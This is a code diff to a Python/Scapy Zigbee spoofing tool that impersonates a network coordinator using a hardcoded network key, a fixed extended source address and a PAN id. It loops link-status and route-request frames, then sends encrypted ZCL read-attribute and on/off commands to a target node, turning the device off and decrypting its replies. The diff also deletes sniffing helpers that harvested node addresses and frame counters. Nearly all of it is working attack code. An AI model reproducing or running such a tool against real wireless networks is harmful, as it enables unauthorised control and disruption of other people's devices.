@@ -11,6 +11,9 @@ import time
 
 database = {
     "network_key" : bytes.fromhex("31701f12dd93150ec4efce97e381ef06"),
+    "extended_source_addr" : bytes.fromhex("00:12:4b:00:1c:dd:27:3d".replace(":", "")),
+    "pan_id" : 0x1a62,
+    "target_node" : 0x943f,
     "nodes" : {},
     "frame_counter" : randint(0, 255) 
     }
@@ -22,67 +25,25 @@ class ZigbeeSpoofer:
         
     def spoofing_loop(self):
         while True:
-            sendp(self.frame_provider.link_status(0x1a62), iface="wpan0")
-            #send a many to one route request to the
-            sendp(self.frame_provider.many_to_one_route_request(0xfffd, 0x1a62), iface="wpan0")
+            sendp(self.frame_provider.link_status(database["pan_id"]), iface="wpan0")
+            sendp(self.frame_provider.many_to_one_route_request(0xfffd, database["pan_id"]), iface="wpan0")
             time.sleep(5)
 
-
-def gather_nodes_and_extended_source(iface: str) -> dict:
-    #sniff some traffic to build up a list of nodes:
-    dict_of_nodes = {}
-    def add_node(node: Dot15d4FCS):
-        #node.show()
-        if node.src_addr not in dict_of_nodes:
-            dict_of_nodes[node.src_addr] = 0
-            print(f"new node found: {node.src_addr:04x}")
-        if dict_of_nodes[node.src_addr] == 0 and node.haslayer(ZigbeeSecurityHeader) and node.flags == 'security+extended_src':
-            dict_of_nodes[node.src_addr] = node.ext_src.to_bytes(8, 'big')
-            print(f"extended source found: {node.ext_src:016x}")
-    global database
-    database["nodes"] = dict_of_nodes
-    
-    sniff(iface=iface, prn=lambda x: add_node(Dot15d4FCS(x.do_build())), store=False, timeout=10)
-    return dict_of_nodes
-
-def find_counters(iface: str, nodes: dict):
-    #sniff some traffic to find the frame counters of the nodes:
-    def find_counter(node: Dot15d4FCS):
-        if node.src_addr in nodes and node.haslayer(ZigbeeSecurityHeader):
-            print(f"node {node.src_addr:04x} has frame counter {node.fc}")
-            node.show()
-            if node.src_addr == 0x0:
-                global frame_counter 
-                frame_counter = node.fc
-
-    sniff(iface=iface, prn=lambda x: find_counter(Dot15d4FCS(x.do_build())), store=False, timeout=10)
-
 if __name__ == '__main__':
-    #from util.wpan_interface import Phy
     
-    source_addr = bytes.fromhex("00:12:4b:00:1c:dd:27:3d".replace(":", ""))
-    phy=Phy(int.from_bytes(source_addr), initial_channel=11, initialize=True, debug_monitor=False)
-    
-    '''
-    gather_nodes_and_extended_source("wpan0")
-    
-    print("List of nodes:")
-    for node in dict_of_nodes.keys():
-        print(f"node {node:04x}, extended source: {dict_of_nodes[node]:016x}")
-        
-    find_counters("wpan0", dict_of_nodes)
-    '''
+    phy=Phy(int.from_bytes(database["extended_source_addr"]), initial_channel=11, pan_id=database["pan_id"],initialize=True, debug_monitor=False)
+
     fp = FrameProvider()
     fp.set_security_frame_counter(database["frame_counter"])
-    fp.set_extended_source(source_addr)
+    fp.set_extended_source(database["extended_source_addr"])
     fp.set_nwk_key(database["network_key"])
     
+    #link status and route request looper on a 5 second interval:
     ZigbeeSpoofer(fp)
     
-    #link status and route request looper on a 10 second interval:
     
     def response_proc(packet: Packet, transaction_sequence: int) -> bool:
-        if packet is not None and packet.src_addr == 0x943f:
+        if packet is not None and packet.src_addr == database["target_node"]:
             print(f"Packet: {packet.summary()}")
             if packet.haslayer(ZigbeeNWK) and packet.flags & 16:   
                 print(f"extended source found: {packet.ext_src:016x}")
@@ -95,16 +56,9 @@ if __name__ == '__main__':
                     if decrypted_payload.haslayer(ZigbeeClusterLibrary) and decrypted_payload.transaction_sequence == transaction_sequence:
                         decrypted_payload.show()
                         return True
-                    
-    '''
-        if packet.haslayer(ZCLGeneralReadAttributesResponse):
-            print("Got a response")
-            packet.show()
-            return True
-        return
-    '''
+
     while True:
-        read_attributes_frame, transaction_sequence = fp.zcl_read_attributes(0x0, 0x1a62, 0x943f)
+        read_attributes_frame, transaction_sequence = fp.zcl_read_attributes(0x0, database["pan_id"], database["target_node"])
         Transceiver.send_and_receive(read_attributes_frame, response_proc, sleep_time=2, transaction_sequence_number=transaction_sequence)
-        write_attributes_frame, transaction_sequence = fp.zcl_on_off(0x0, 0x1a62, 0x943f, False)
+        write_attributes_frame, transaction_sequence = fp.zcl_on_off(0x0, database["pan_id"], database["target_node"], False)
         Transceiver.send_and_receive(write_attributes_frame, response_proc, sleep_time=2, transaction_sequence_number=transaction_sequence)
